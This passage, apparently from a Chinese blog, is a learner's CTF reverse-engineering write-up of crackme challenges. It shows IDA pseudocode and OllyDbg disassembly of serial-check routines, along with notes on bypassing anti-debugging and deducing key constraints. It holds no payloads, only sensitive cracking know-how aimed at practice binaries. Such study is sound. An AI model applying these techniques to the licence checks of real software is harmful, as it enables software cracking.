rel="external">http://pan.baidu.com/s/1kUYItoz</a> 密码：xem0<br>第三题，我感觉世界观坍塌啦。依然不会，还是学习为主。看大神们的记录，学习一遍</p><h2 id="3、分析"><a href="#3、分析" class="headerlink" title="3、分析"></a>3、分析</h2><p>一、侦查：无壳 Microsoft Visual C/C++(6.0)[libc]，诸多反调试<br>二、入坑：<br>OD加载（好像我的od直接过了反调试），f9，运行，什么鬼，直接跳到了dll,继续f9….终于出现对话框，输入<br>12345678，结果程序崩溃。</p><p>IDA打开，定位到CrackMe字符串，找到关键函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div></pre></td><td class="code"><pre><div class="line">int __stdcall sub_434EF0(HWND hDlg, int a2, int a3, int a4)</div><div class="line">&#123;</div><div class="line">  int v4; // ST0C_4@17</div><div class="line">  CHAR *v5; // esi@17</div><div class="line">  int v6; // eax@17</div><div class="line">  int v8; // [sp+0h] [bp-1A4Ch]@18</div><div class="line">  int v9; // [sp+4h] [bp-1A48h]@18</div><div class="line">  int v10; // [sp+8h] [bp-1A44h]@18</div><div class="line">  int v11; // [sp+Ch] [bp-1A40h]@1</div><div class="line">  int i; // [sp+1C4h] [bp-1888h]@14</div><div class="line">  char v13[1032]; // [sp+1D0h] [bp-187Ch]@16</div><div class="line">  char v14[40]; // [sp+5D8h] [bp-1474h]@14</div><div class="line">  int v15; // [sp+600h] [bp-144Ch]@14</div><div class="line">  char v16; // [sp+60Ch] [bp-1440h]@14</div><div class="line">  char v17; // [sp+60Dh] [bp-143Fh]@14</div><div class="line">  char v18; // [sp+A14h] [bp-1038h]@14</div><div class="line">  char v19; // [sp+A15h] [bp-1037h]@14</div><div class="line">  char v20; // [sp+E1Ch] [bp-C30h]@14</div><div class="line">  char v21; // [sp+E1Dh] [bp-C2Fh]@14</div><div class="line">  CHAR String; // [sp+1224h] [bp-828h]@14</div><div class="line">  char v23; // [sp+1225h] [bp-827h]@14</div><div class="line">  int v24; // [sp+162Ch] [bp-420h]@14</div><div class="line">  char v25; // [sp+1638h] [bp-414h]@1</div><div class="line">  char v26; // [sp+1639h] [bp-413h]@1</div><div class="line">  int v27; // [sp+1A40h] [bp-Ch]@1</div><div class="line">  unsigned int v28; // [sp+1A48h] [bp-4h]@1</div><div class="line">  int savedregs; // [sp+1A4Ch] [bp+0h]@1</div><div class="line"></div><div class="line">  memset(&amp;v11, 0xCCu, 0x1A40u);</div><div class="line">  v28 = (unsigned int)&amp;savedregs ^ dword_49B344;</div><div class="line">  v27 = 0;</div><div class="line">  v25 = 0;</div><div class="line">  sub_42D5E6(&amp;v26, 0, 1023);</div><div class="line">  v11 = a2;</div><div class="line">  if ( a2 == 16 )</div><div class="line">    ExitProcess(0);</div><div class="line">  if ( v11 == 272 )</div><div class="line">  &#123;</div><div class="line">    v27 = sub_42D4F1();</div><div class="line">    if ( v27 == 1 )</div><div class="line">      ExitProcess(0);</div><div class="line">    v27 = 0;</div><div class="line">    v27 = sub_42E428();</div><div class="line">    if ( v27 == 1 )</div><div class="line">      ExitProcess(0);</div><div class="line">    v27 = 0;</div><div class="line">    v27 = sub_42D825();</div><div class="line">    if ( v27 == 1 )</div><div class="line">      ExitProcess(0);</div><div class="line">    sub_42D14F(hDlg, 1);</div><div class="line">  &#125;</div><div class="line">  else if ( v11 == 273 )</div><div class="line">  &#123;</div><div class="line">    v11 = (unsigned __int16)a3;</div><div class="line">    if ( (unsigned __int16)a3 == 1002 )</div><div class="line">    &#123;</div><div class="line">      String = 0;</div><div class="line">      sub_42D5E6(&amp;v23, 0, 1023);</div><div class="line">      v20 = 0;</div><div class="line">      sub_42D5E6(&amp;v21, 0, 1023);</div><div class="line">      GetDlgItemTextA(hDlg, 1001, &amp;String, 1025);</div><div class="line">      v24 = sub_42DE51();</div><div class="line">      v18 = 0;</div><div class="line">      sub_42D5E6(&amp;v19, 0, 1023);</div><div class="line">      sub_42D267(&amp;String, 1024, &amp;v20);</div><div class="line">      v16 = 0;</div><div class="line">      sub_42D5E6(&amp;v17, 0, 1023);</div><div class="line">      sub_42D267(&amp;v20, 1024, &amp;v18);</div><div class="line">      sub_42D96A(&amp;v18, &amp;v16, 1024);</div><div class="line">      v15 = 3;</div><div class="line">      sub_42DA78(&amp;v18, 3, v14);</div><div class="line">      for ( i = 0; i &lt; 32; ++i )</div><div class="line">        sub_42DF05(&amp;v13[2 * i], &quot;%02x&quot;, v14[i]);</div><div class="line">      v4 = sub_42D794(v13);</div><div class="line">      v5 = &amp;String + sub_42D794(&amp;String);</div><div class="line">      v6 = sub_42D794(v13);</div><div class="line">      if ( !sub_42DB27(v13, &amp;v5[-v6], v4) )</div><div class="line">      &#123;</div><div class="line">        sub_42D0B4(v8, v9, v10);</div><div class="line">        if ( (unsigned __int8)sub_42D9AB(&amp;unk_49B000, &amp;v16) == 1 )</div><div class="line">        &#123;</div><div class="line">          MessageBoxA(0, &quot;ok&quot;, &quot;CrackMe&quot;, 0);</div><div class="line">          sub_42DE51();</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  sub_42D65E(&amp;savedregs, &amp;dword_435250);</div><div class="line">  sub_42D1E5();</div><div class="line">  return sub_42DE51();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>哇，还是经验太少，这里许多函数看不懂。</p><p>再用OD打开，发现程序有随机化，好烦，f9…出现对话框，按道理这时候可以在读取字符的API下断点，这里是GetDlgItemTextA。然而，我在当前模块中没有找到，后来发现个插件-设置API断点，总算断下来啦。接下来分析算法啦(这是我的能力还是太弱了)。</p><p>借助大神们的wp<br>IDA反汇编关键函数<br><img src="http://ww4.sinaimg.cn/large/006rgqhqly1fl19dym9r5j30xg0jvn5i.jpg" alt=""></p><p>这个直接明文:<br><img src="http://ww2.sinaimg.cn/large/006rgqhqly1fl19irbza0j30xq0cjtef.jpg" alt=""><br>我自己尝试，然而，我来到这个函数，程序执行后就崩溃了<br><img src="http://ww3.sinaimg.cn/large/006rgqhqly1fl19m8qbthj31180ho41f.jpg" alt=""><br>继续分析。</p><p>猜测作者意图<br>1、获取输入 ipt<br>2、两次 base64 解码得到 buf<br>3、自定义解码得到 cmd<br>4、判断 sm3(buf[:3) == ipt[-64:]<br>5、cmd 能在迷宫走到终点</p><h1 id="4、Re4"><a href="#4、Re4" class="headerlink" title="4、Re4"></a>4、Re4</h1><h2 id="1、题目-2"><a href="#1、题目-2" class="headerlink" title="1、题目"></a>1、题目</h2><p>链接：<a href="http://pan.baidu.com/s/1kUYItoz" target="_blank" rel="external">http://pan.baidu.com/s/1kUYItoz</a> 密码：xem0<br>学习为主。看大神们的记录，学习一遍</p><h2 id="3、分析-1"><a href="#3、分析-1" class="headerlink" title="3、分析"></a>3、分析</h2><p>一、侦查：无壳 Microsoft Visual C/C++(6.0)[libc]，诸多反调试<br>二、OD附加，过反调试<br>先运行exe程序，再打开od附加exe进程，再调用GetWindowTextW的API时候下断点，点击运行，exe程序输入sn,此时会断在od中的GetWindowTextW的断点（还在api系统区）<br><img src="" alt=""><br>往下走来到程序区<br><img src="" alt=""><br>往下走,主要细节<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div></pre></td><td class="code"><pre><div class="line">01151CB0    55              push    ebp</div><div class="line">01151CB1    8BEC            mov     ebp, esp</div><div class="line">01151CB3    81EC D0000000   sub     esp, 0xD0</div><div class="line">01151CB9    A1 14F01601     mov     eax, dword ptr [0x116F014]</div><div class="line">01151CBE    33C5            xor     eax, ebp</div><div class="line">01151CC0    8945 FC         mov     dword ptr [ebp-0x4], eax</div><div class="line">01151CC3    57              push    edi</div><div class="line">01151CC4    8BF9            mov     edi, ecx</div><div class="line">01151CC6    85FF            test    edi, edi</div><div class="line">01151CC8    0F84 61010000   je      01151E2F</div><div class="line">01151CCE    85D2            test    edx, edx</div><div class="line">01151CD0    0F85 81000000   jnz     01151D57</div><div class="line">01151CD6    E8 25FFFFFF     call    01151C00       ;判断注册码是否包含&apos;b&apos;</div><div class="line">01151CDB    85C0            test    eax, eax</div><div class="line">01151CDD    74 54           je      short 01151D33</div><div class="line">01151CDF    68 C8000000     push    0xC8</div><div class="line">01151CE4    8D85 34FFFFFF   lea     eax, dword ptr [ebp-0xCC]</div><div class="line">01151CEA    6A 00           push    0x0</div><div class="line">01151CEC    50              push    eax</div><div class="line">01151CED    E8 DE1C0000     call    &lt;memset&gt;</div><div class="line">01151CF2    83C4 0C         add     esp, 0xC</div><div class="line">01151CF5    8D85 34FFFFFF   lea     eax, dword ptr [ebp-0xCC]</div><div class="line">01151CFB    6A 64           push    0x64</div><div class="line">01151CFD    50              push    eax</div><div class="line">01151CFE    FF77 0C         push    dword ptr [edi+0xC]</div><div class="line">01151D01    FF15 4C811601   call    dword ptr [&lt;&amp;USER32.GetWindowTex&gt;; user32.GetWindowTextW</div><div class="line">01151D07    6A 70           push    0x70</div><div class="line">01151D09    8D95 34FFFFFF   lea     edx, dword ptr [ebp-0xCC]</div><div class="line">01151D0F    E8 3C0D0000     call    01152A50    ; 判断注册码里是否包含&apos;p&apos;</div><div class="line">01151D14    85C0            test    eax, eax</div><div class="line">01151D16    74 1B           je      short 01151D33</div><div class="line">01151D18    BA 01000000     mov     edx, 0x1</div><div class="line">01151D1D    8BCF            mov     ecx, edi</div><div class="line">01151D1F    E8 8CFFFFFF     call    01151CB0</div><div class="line">01151D24    5F              pop     edi</div><div class="line">01151D25    8B4D FC         mov     ecx, dword ptr [ebp-0x4]</div><div class="line">01151D28    33CD            xor     ecx, ebp</div><div class="line">01151D2A    E8 960F0000     call    01152CC5</div><div class="line">01151D2F    8BE5            mov     esp, ebp</div><div class="line">01151D31    5D              pop     ebp</div><div class="line">01151D32    C3              retn</div><div class="line">01151D33    6A 00           push    0x0</div><div class="line">01151D35    68 0F040000     push    0x40F</div><div class="line">01151D3A    68 11010000     push    0x111</div><div class="line">01151D3F    FF77 04         push    dword ptr [edi+0x4]</div><div class="line">01151D42    FF15 50811601   call    dword ptr [&lt;&amp;USER32.SendMessageW&gt;; user32.SendMessageW</div><div class="line">01151D48    5F              pop     edi</div><div class="line">01151D49    8B4D FC         mov     ecx, dword ptr [ebp-0x4]</div><div class="line">01151D4C    33CD            xor     ecx, ebp</div><div class="line">01151D4E    E8 720F0000     call    01152CC5</div><div class="line">01151D53    8BE5            mov     esp, ebp</div><div class="line">01151D55    5D              pop     ebp</div><div class="line">01151D56    C3              retn</div><div class="line">01151D33    6A 00           push    0x0</div><div class="line">01151D35    68 0F040000     push    0x40F</div><div class="line">01151D3A    68 11010000     push    0x111</div><div class="line">01151D3F    FF77 04         push    dword ptr [edi+0x4]</div><div class="line">01151D42    FF15 50811601   call    dword ptr [&lt;&amp;USER32.SendMessageW&gt;; user32.SendMessageW</div><div class="line">01151D48    5F              pop     edi</div><div class="line">01151D49    8B4D FC         mov     ecx, dword ptr [ebp-0x4]</div><div class="line">01151D4C    33CD            xor     ecx, ebp</div><div class="line">01151D4E    E8 720F0000     call    01152CC5</div><div class="line">01151D53    8BE5            mov     esp, ebp</div><div class="line">01151D55    5D              pop     ebp</div><div class="line">01151D56    C3              retn</div><div class="line">01151D57    56              push    esi</div><div class="line">01151D58    E8 812B0000     call    011548DE</div><div class="line">01151D5D    68 C8000000     push    0xC8</div><div class="line">01151D62    8985 30FFFFFF   mov     dword ptr [ebp-0xD0], eax</div><div class="line">01151D68    8D85 34FFFFFF   lea     eax, dword ptr [ebp-0xCC]</div><div class="line">01151D6E    6A 00           push    0x0</div><div class="line">01151D70    50              push    eax</div><div class="line">01151D71    E8 5A1C0000     call    &lt;memset&gt;</div><div class="line">01151D76    83C4 0C         add     esp, 0xC</div><div class="line">01151D79    8D85 34FFFFFF   lea     eax, dword ptr [ebp-0xCC]</div><div class="line">01151D7F    68 C8000000     push    0xC8</div><div class="line">01151D84    50              push    eax</div><div class="line">01151D85    FF77 0C         push    dword ptr [edi+0xC]</div><div class="line">01151D88    FF15 4C811601   call    dword ptr [&lt;&amp;USER32.GetWindowTex&gt;; user32.GetWindowTextW</div><div class="line">01151D8E    33F6            xor     esi, esi</div><div class="line">01151D90    8D85 34FFFFFF   lea     eax, dword ptr [ebp-0xCC]</div><div class="line">01151D96    66:39B5 34FFFFF&gt;cmp     word ptr [ebp-0xCC], si</div><div class="line">01151D9D    74 0B           je      short 01151DAA</div><div class="line">01151D9F    90              nop</div><div class="line">01151DA0    8D40 02         lea     eax, dword ptr [eax+0x2]</div><div class="line">01151DA3    46              inc     esi</div><div class="line">01151DA4    66:8338 00      cmp     word ptr [eax], 0x0</div><div class="line">01151DA8  ^ 75 F6           jnz     short 01151DA0</div><div class="line">01151DAA    33C9            xor     ecx, ecx</div><div class="line">01151DAC    8D46 01         lea     eax, dword ptr [esi+0x1]</div><div class="line">01151DAF    BA 02000000     mov     edx, 0x2</div><div class="line">01151DB4    F7E2            mul     edx</div><div class="line">01151DB6    53              push    ebx</div><div class="line">01151DB7    0F90C1          seto    cl</div><div class="line">01151DBA    F7D9            neg     ecx</div><div class="line">01151DBC    0BC8            or      ecx, eax</div><div class="line">01151DBE    51              push    ecx</div><div class="line">01151DBF    E8 120F0000     call    01152CD6</div><div class="line">01151DC4    83C4 04         add     esp, 0x4</div><div class="line">01151DC7    8BD8            mov     ebx, eax</div><div class="line">01151DC9    E8 102B0000     call    011548DE</div><div class="line">01151DCE    2B85 30FFFFFF   sub     eax, dword ptr [ebp-0xD0]</div><div class="line">01151DD4    83F8 02         cmp     eax, 0x2</div><div class="line">01151DD7    7F 65           jg      short 01151E3E</div><div class="line">01151DD9    8D85 34FFFFFF   lea     eax, dword ptr [ebp-0xCC]</div><div class="line">01151DDF    50              push    eax</div><div class="line">01151DE0    53              push    ebx</div><div class="line">01151DE1    E8 8A0A0000     call    01152870</div><div class="line">01151DE6    83FE 07         cmp     esi, 0x7           ;注册码是否为7位</div><div class="line">01151DE9    73 0B           jnb     short 01151DF6</div><div class="line">01151DEB    6A 00           push    0x0</div><div class="line">01151DED    6A 00           push    0x0</div><div class="line">01151DEF    68 0E040000     push    0x40E</div><div class="line">01151DF4    EB 0B           jmp     short 01151E01</div><div class="line">01151DF6    76 2C           jbe     short 01151E24</div><div class="line">01151DF8    6A 00           push    0x0</div><div class="line">01151DFA    6A 00           push    0x0</div><div class="line">01151DFC    68 0D040000     push    0x40D</div><div class="line">01151E01    FF77 04         push    dword ptr [edi+0x4]</div><div class="line">01151E04    FF15 50811601   call    dword ptr [&lt;&amp;USER32.SendMessageW&gt;; user32.SendMessageW</div><div class="line">01151E0A    53              push    ebx</div><div class="line">01151E0B    E8 CF0E0000     call    01152CDF</div><div class="line">01151E10    83C4 04         add     esp, 0x4</div><div class="line">01151E13    5B              pop     ebx</div><div class="line">01151E14    5E              pop     esi</div><div class="line">01151E15    5F              pop     edi</div><div class="line">01151E16    8B4D FC         mov     ecx, dword ptr [ebp-0x4]</div><div class="line">01151E19    33CD            xor     ecx, ebp</div><div class="line">01151E1B    E8 A50E0000     call    01152CC5</div><div class="line">01151E20    8BE5            mov     esp, ebp</div><div class="line">01151E22    5D              pop     ebp</div><div class="line">01151E23    C3              retn</div><div class="line">01151E24    8BD3            mov     edx, ebx</div><div class="line">01151E26    8BCF            mov     ecx, edi</div><div class="line">01151E28    E8 33FCFFFF     call    01151A60        ;这里进入最后的判断</div><div class="line">01151E2D    5B              pop     ebx</div><div class="line">01151E2E    5E              pop     esi</div><div class="line">01151E2F    8B4D FC         mov     ecx, dword ptr [ebp-0x4]</div><div class="line">01151E32    33CD            xor     ecx, ebp</div><div class="line">01151E34    5F              pop     edi</div><div class="line">01151E35    E8 8B0E0000     call    01152CC5</div><div class="line">01151E3A    8BE5            mov     esp, ebp</div><div class="line">01151E3C    5D              pop     ebp</div><div class="line">01151E3D    C3              retn</div><div class="line">01151E3E    6A 00           push    0x0</div><div class="line">01151E40    E8 6C2D0000     call    01154BB1</div></pre></td></tr></table></figure></p><p>以上代码得出注册码必须为7位并且包含字符’b’,’p’<br>再看最后的判断call<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div></pre></td><td class="code"><pre><div class="line">01151870    55              push    ebp</div><div class="line">01151871    8BEC            mov     ebp, esp</div><div class="line">01151873    83EC 54         sub     esp, 0x54</div><div class="line">01151876    A1 14F01601     mov     eax, dword ptr [0x116F014]</div><div class="line">0115187B    33C5            xor     eax, ebp</div><div class="line">0115187D    8945 FC         mov     dword ptr [ebp-0x4], eax</div><div class="line">01151880    53              push    ebx</div><div class="line">01151881    56              push    esi</div><div class="line">01151882    57              push    edi</div><div class="line">01151883    6A 36           push    0x36</div><div class="line">01151885    8D45 B0         lea     eax, dword ptr [ebp-0x50]</div><div class="line">01151888    8BD9            mov     ebx, ecx</div><div class="line">0115188A    6A 00           push    0x0</div><div class="line">0115188C    50              push    eax</div><div class="line">0115188D    8BFA            mov     edi, edx</div><div class="line">0115188F    895D AC         mov     dword ptr [ebp-0x54], ebx</div><div class="line">01151892    E8 39210000     call    &lt;memset&gt;</div><div class="line">01151897    83C4 0C         add     esp, 0xC</div><div class="line">0115189A    8D4D E8         lea     ecx, dword ptr [ebp-0x18]</div><div class="line">0115189D    B8 30000000     mov     eax, 0x30</div><div class="line">011518A2    66:8901         mov     word ptr [ecx], ax</div><div class="line">011518A5    8D49 02         lea     ecx, dword ptr [ecx+0x2]</div><div class="line">011518A8    40              inc     eax</div><div class="line">011518A9    83F8 39         cmp     eax, 0x39</div><div class="line">011518AC  ^ 7E F4           jle     short 011518A2                   ; 0-9</div><div class="line">011518AE    B8 61000000     mov     eax, 0x61</div><div class="line">011518B3    8D4D B0         lea     ecx, dword ptr [ebp-0x50]</div><div class="line">011518B6    66:8901         mov     word ptr [ecx], ax</div><div class="line">011518B9    8D49 02         lea     ecx, dword ptr [ecx+0x2]</div><div class="line">011518BC    40              inc     eax</div><div class="line">011518BD    83F8 7A         cmp     eax, 0x7A</div><div class="line">011518C0  ^ 7E F4           jle     short 011518B6                   ; a-z</div><div class="line">011518C2    33D2            xor     edx, edx</div><div class="line">011518C4    8D45 B0         lea     eax, dword ptr [ebp-0x50]</div><div class="line">011518C7    66:3955 B0      cmp     word ptr [ebp-0x50], dx</div><div class="line">011518CB    74 0D           je      short 011518DA</div><div class="line">011518CD    0F1F            ???                                      ; 未知命令</div><div class="line">011518CF    008D 40024266   add     byte ptr [ebp+0x66420240], cl</div><div class="line">011518D5    8338 00         cmp     dword ptr [eax], 0x0</div><div class="line">011518D8  ^ 75 F6           jnz     short 011518D0</div><div class="line">011518DA    33C9            xor     ecx, ecx</div><div class="line">011518DC    85D2            test    edx, edx</div><div class="line">011518DE    74 1C           je      short 011518FC</div><div class="line">011518E0    0FB7444D B0     movzx   eax, word ptr [ebp+ecx*2-0x50]</div><div class="line">011518E5    83F8 61         cmp     eax, 0x61</div><div class="line">011518E8    72 0D           jb      short 011518F7</div><div class="line">011518EA    83F8 7A         cmp     eax, 0x7A</div><div class="line">011518ED    77 08           ja      short 011518F7</div><div class="line">011518EF    83C0 E0         add     eax, -0x20</div><div class="line">011518F2    66:89444D B0    mov     word ptr [ebp+ecx*2-0x50], ax</div><div class="line">011518F7    41              inc     ecx</div><div class="line">011518F8    3BCA            cmp     ecx, edx</div><div class="line">011518FA  ^ 72 E4           jb      short 011518E0</div><div class="line">011518FC    33C9            xor     ecx, ecx</div><div class="line">011518FE    8BC7            mov     eax, edi</div><div class="line">01151900    85FF            test    edi, edi</div><div class="line">01151902    74 76           je      short 0115197A</div><div class="line">01151904    66:390F         cmp     word ptr [edi], cx</div><div class="line">01151907    74 11           je      short 0115191A</div><div class="line">01151909    0F1F            ???                                      ; 未知命令</div><div class="line">0115190B    8000 00         add     byte ptr [eax], 0x0</div><div class="line">0115190E    0000            add     byte ptr [eax], al</div><div class="line">01151910    8D40 02         lea     eax, dword ptr [eax+0x2]</div><div class="line">01151913    41              inc     ecx</div><div class="line">01151914    66:8338 00      cmp     word ptr [eax], 0x0</div><div class="line">01151918  ^ 75 F6           jnz     short 01151910</div><div class="line">0115191A    33C0            xor     eax, eax</div><div class="line">0115191C    85C9            test    ecx, ecx</div><div class="line">0115191E    74 22           je      short 01151942</div><div class="line">01151920    83F8 02         cmp     eax, 0x2</div><div class="line">01151923    73 07           jnb     short 0115192C</div><div class="line">01151925    66:833447 0F    xor     word ptr [edi+eax*2], 0xF</div><div class="line">0115192A    EB 11           jmp     short 0115193D</div><div class="line">0115192C    83F8 04         cmp     eax, 0x4</div><div class="line">0115192F    73 07           jnb     short 01151938</div><div class="line">01151931    66:833447 50    xor     word ptr [edi+eax*2], 0x50</div><div class="line">01151936    EB 05           jmp     short 0115193D</div><div class="line">01151938    66:833447 42    xor     word ptr [edi+eax*2], 0x42</div><div class="line">0115193D    40              inc     eax</div><div class="line">0115193E    3BC1            cmp     eax, ecx</div><div class="line">01151940  ^ 72 DE           jb      short 01151920</div><div class="line">01151942    33D2            xor     edx, edx</div><div class="line">01151944    8BC7            mov     eax, edi</div><div class="line">01151946    66:3917         cmp     word ptr [edi], dx</div><div class="line">01151949    74 0F           je      short 0115195A</div><div class="line">0115194B    0F1F            ???                                      ; 未知命令</div><div class="line">0115194D    44              inc     esp</div><div class="line">0115194E    0000            add     byte ptr [eax], al</div><div class="line">01151950    8D40 02         lea     eax, dword ptr [eax+0x2]</div><div class="line">01151953    42              inc     edx</div><div class="line">01151954    66:8338 00      cmp     word ptr [eax], 0x0</div><div class="line">01151958  ^ 75 F6           jnz     short 01151950</div><div class="line">0115195A    33C9            xor     ecx, ecx</div><div class="line">0115195C    85D2            test    edx, edx</div><div class="line">0115195E    74 1A           je      short 0115197A</div><div class="line">01151960    0FB7044F        movzx   eax, word ptr [edi+ecx*2]</div><div class="line">01151964    83F8 61         cmp     eax, 0x61</div><div class="line">01151967    72 0C           jb      short 01151975</div><div class="line">01151969    83F8 7A         cmp     eax, 0x7A</div><div class="line">0115196C    77 07           ja      short 01151975</div><div class="line">0115196E    83C0 E0         add     eax, -0x20</div><div class="line">01151971    66:89044F       mov     word ptr [edi+ecx*2], ax</div><div class="line">01151975    41              inc     ecx</div><div class="line">01151976    3BCA            cmp     ecx, edx</div><div class="line">01151978  ^ 72 E6           jb      short 01151960</div><div class="line">0115197A    33F6            xor     esi, esi</div><div class="line">0115197C    0F57C0          xorps   xmm0, xmm0</div><div 